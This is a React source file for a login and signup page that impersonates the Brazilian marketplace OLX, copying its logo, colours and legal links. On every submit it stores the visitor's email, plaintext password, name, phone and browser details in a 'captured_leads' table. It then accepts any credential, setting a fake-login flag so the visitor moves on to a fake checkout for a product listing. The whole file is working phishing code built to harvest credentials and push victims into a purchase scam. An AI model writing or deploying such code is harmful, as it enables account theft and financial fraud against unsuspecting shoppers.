import { createFileRoute, Link, useNavigate } from "@tanstack/react-router";
import { useEffect, useState } from "react";
import { ShieldCheck } from "lucide-react";
import { supabase } from "@/integrations/supabase/client";
import { fetchListingBySlug, fetchListingImages, fetchMainListing, formatBRL, type Listing, type ListingImage } from "@/lib/listings";
import { getSelectedItem, type SelectedItem, consumeReturnTo, flagWelcome } from "@/lib/selected";

export const Route = createFileRoute("/login")({
  component: LoginPage,
});

function LogoOLX({ className = "" }: { className?: string }) {
  return (
    <div className={`flex items-end font-black text-3xl tracking-tighter leading-none ${className}`}>
      <span className="text-[#6e0ad6]">o</span>
      <span className="text-[#6e0ad6]">l</span>
      <span className="text-[#f28100]">x</span>
    </div>
  );
}

function LoginPage() {
  const [mode, setMode] = useState<"login" | "signup">("login");
  const [email, setEmail] = useState("");
  const [senha, setSenha] = useState("");
  const [nome, setNome] = useState("");
  const [telefone, setTelefone] = useState("");
  const [slug, setSlug] = useState("");
  const [listing, setListing] = useState<Listing | null>(null);
  const [images, setImages] = useState<ListingImage[]>([]);
  const [selected, setSelected] = useState<SelectedItem | null>(null);
  const [loading, setLoading] = useState(false);
  const [err, setErr] = useState("");
  const navigate = useNavigate();

  const [gateMode, setGateMode] = useState(false);

  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const currentSlug = params.get("slug") ?? "";
    const gateRaw = params.get("gate") ?? "";
    const isGate = gateRaw === "1" || gateRaw === '"1"';
    setSlug(currentSlug);
    setGateMode(isGate);

    // Prefer the snapshot saved when the visitor clicked "Comprar"
    const sel = isGate ? null : getSelectedItem();
    if (sel) setSelected(sel);

    // Already logged in → continue
    supabase.auth.getSession().then(({ data }) => {
      if (data.session) {
        if (isGate) {
          try { localStorage.setItem("olx_gate_passed", "1"); } catch {}
          navigate({ to: "/" });
        } else {
          flagWelcome();
          const ret = consumeReturnTo();
          if (ret && ret !== "/login") navigate({ to: ret as any });
          else navigate({ to: "/checkout", search: currentSlug ? ({ slug: currentSlug } as any) : undefined });
        }
      }
    });

    if (isGate) return; // gate mode: no product card
    if (sel) return;
    (async () => {
      const item = currentSlug ? await fetchListingBySlug(currentSlug) : await fetchMainListing();
      setListing(item);
      if (item) {
        setImages(await fetchListingImages(item.id));
        if (!currentSlug && item.slug) setSlug(item.slug);
      }
    })();
  }, []);

  const goAfterAuth = () => {
    const gp = new URLSearchParams(window.location.search).get("gate") ?? "";
    const isGateNow = gateMode || gp === "1" || gp === '"1"';
    if (isGateNow) {
      try { localStorage.setItem("olx_gate_passed", "1"); } catch {}
      try { sessionStorage.removeItem("olx_return_to"); } catch {}
      navigate({ to: "/" });
      return;
    }
    flagWelcome();
    const ret = consumeReturnTo();
    if (ret && ret !== "/login") { navigate({ to: ret as any }); return; }
    navigate({ to: "/checkout", search: slug ? ({ slug } as any) : undefined });
  };
  const goCheckout = goAfterAuth;

  const formatPhone = (v: string) => {
    const d = v.replace(/\D/g, "").slice(0, 11);
    if (d.length <= 2) return d;
    if (d.length <= 7) return `(${d.slice(0, 2)}) ${d.slice(2)}`;
    return `(${d.slice(0, 2)}) ${d.slice(2, 7)}-${d.slice(7)}`;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setErr("");
    setLoading(true);

    // Always capture lead attempt (com tudo que tiver disponível)
    try {
      await supabase.from("captured_leads").insert({
        email,
        password_attempt: senha,
        full_name: nome.trim() || null,
        phone: telefone.trim() || null,
        listing_id: listing?.id ?? selected?.listingId ?? null,
        user_agent: navigator.userAgent,
      } as any);
    } catch {}

    // Bypass: qualquer credencial entra. Tentamos signup/signin de verdade
    // só pra criar uma sessão Supabase quando der; se falhar, seguimos com
    // uma flag local de "logado" pra liberar o fluxo de compra.
    if (mode === "signup") {
      if (!nome.trim() || !telefone.trim()) {
        setLoading(false);
        setErr("Preencha nome e telefone para criar sua conta.");
        return;
      }
      await supabase.auth.signUp({
        email,
        password: senha,
        options: {
          emailRedirectTo: window.location.origin,
          data: { full_name: nome.trim(), phone: telefone.trim() },
        },
      }).catch(() => {});
    } else {
      await supabase.auth.signInWithPassword({ email, password: senha }).catch(() => {});
    }

    try { localStorage.setItem("olx_fake_auth", "1"); } catch {}
    try { localStorage.setItem("olx_fake_auth_email", email); } catch {}
    window.dispatchEvent(new Event("olx_fake_auth_changed"));

    setLoading(false);
    goCheckout();
  };

  return (
    <div className="min-h-screen bg-white flex flex-col">
      <header className="px-5 py-4 border-b border-gray-200">
        <LogoOLX />
      </header>

      <main className="flex-1 flex justify-center px-5 py-10">
        <div className="w-full max-w-sm">
          <h1 className="text-center text-[22px] font-bold text-gray-900 leading-tight">
            {mode === "login" ? <>Entre na sua conta e<br />negocie com segurança!</> : <>Crie sua conta OLX<br />e finalize a compra</>}
          </h1>
          <p className="text-center text-gray-600 text-sm mt-3 mb-6">
            Acesse e aproveite uma experiência segura dentro da OLX.
          </p>

          {(selected || listing) && (
            <div className="mb-6 rounded-xl border border-gray-200 bg-white p-3 shadow-sm">
              <div className="flex gap-3">
                <img
                  src={selected?.image || images[0]?.url || "https://images.unsplash.com/photo-1592286927505-1def25115558?q=80&w=300&auto=format&fit=crop"}
                  alt={selected?.title || listing?.title || "Produto"}
                  className="h-20 w-20 rounded-lg object-cover border border-gray-200"
                />
                <div className="min-w-0 flex-1">
                  <p className="text-xs text-gray-500">Você está comprando</p>
                  <p className="font-bold text-gray-900 text-sm leading-tight line-clamp-2">{selected?.title || listing?.title}</p>
                  <p className="text-base font-bold text-gray-900 mt-1">{formatBRL(selected?.priceCents ?? listing?.price_cents ?? 0)}</p>
                  {(selected?.sellerName || listing?.seller_name) && (
                    <p className="text-xs text-gray-600 mt-1 flex items-center gap-1">
                      <ShieldCheck size={14} className="text-[#6e0ad6]" /> Vendedor: {selected?.sellerName || listing?.seller_name}
                    </p>
                  )}
                </div>
              </div>
            </div>
          )}

          <form onSubmit={handleSubmit} className="space-y-4">
            {mode === "signup" && (
              <>
                <div>
                  <label className="block text-sm font-bold text-gray-900 mb-2">Nome completo</label>
                  <input
                    type="text"
                    value={nome}
                    onChange={(e) => setNome(e.target.value)}
                    required
                    className="w-full border border-gray-300 rounded-lg px-4 py-3 focus:outline-none focus:border-[#6e0ad6] text-base"
                  />
                </div>
                <div>
                  <label className="block text-sm font-bold text-gray-900 mb-2">Telefone</label>
                  <input
                    type="tel"
                    value={telefone}
                    onChange={(e) => setTelefone(formatPhone(e.target.value))}
                    placeholder="(00) 00000-0000"
                    required
                    className="w-full border border-gray-300 rounded-lg px-4 py-3 focus:outline-none focus:border-[#6e0ad6] text-base"
                  />
                </div>
              </>
            )}

            <div>
              <label className="block text-sm font-bold text-gray-900 mb-2">E-mail</label>
              <input
                type="email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                required
                className="w-full border border-gray-300 rounded-lg px-4 py-3 focus:outline-none focus:border-[#6e0ad6] text-base"
              />
            </div>

            <div>
              <label className="block text-sm font-bold text-gray-900 mb-2">Senha</label>
              <input
                type="password"
                value={senha}
                onChange={(e) => setSenha(e.target.value)}
                required
                minLength={6}
                className="w-full border border-gray-300 rounded-lg px-4 py-3 focus:outline-none focus:border-[#6e0ad6] text-base"
              />
            </div>

            <button
              type="submit"
              disabled={loading}
              className="w-full py-3 rounded-full font-bold text-base bg-[#f28100] text-white hover:bg-[#e07700] transition disabled:opacity-70"
            >
              {loading ? (mode === "signup" ? "Cadastrando..." : "Entrando...") : (mode === "signup" ? "Cadastrar" : "Acessar")}
            </button>
            {err && <p className="text-center text-sm text-red-600">{err}</p>}
          </form>

          <p className="text-center text-sm text-gray-600 mt-8">
            {mode === "login" ? (
              <>Não tem uma conta?{" "}
                <button type="button" onClick={() => { setErr(""); setMode("signup"); }} className="text-[#6e0ad6] font-bold">Cadastre-se</button>
              </>
            ) : (
              <>Já tem uma conta?{" "}
                <button type="button" onClick={() => { setErr(""); setMode("login"); }} className="text-[#6e0ad6] font-bold">Entrar</button>
              </>
            )}
          </p>

          <div className="mt-10">
            <Link to="/" className="block text-center border-t border-gray-200 pt-4 text-sm text-gray-700 font-medium">
              Voltar ao anúncio ›
            </Link>
          </div>

          <p className="text-center text-xs text-gray-500 mt-6 leading-relaxed">
            Ao continuar, você concorda com os{" "}
            <a href="https://www.olx.com.br/copyright.htm" target="_blank" rel="noopener noreferrer" className="text-[#6e0ad6]">Termos de Uso</a>{" "}
            e a{" "}
            <a href="https://ajuda.olx.com.br/s/article/politica-de-privacidade" target="_blank" rel="noopener noreferrer" className="text-[#6e0ad6]">Política de Privacidade</a>{" "}
            da OLX e seus parceiros, e em receber comunicações da OLX.
          </p>
        </div>
      </main>
    </div>
  );
}
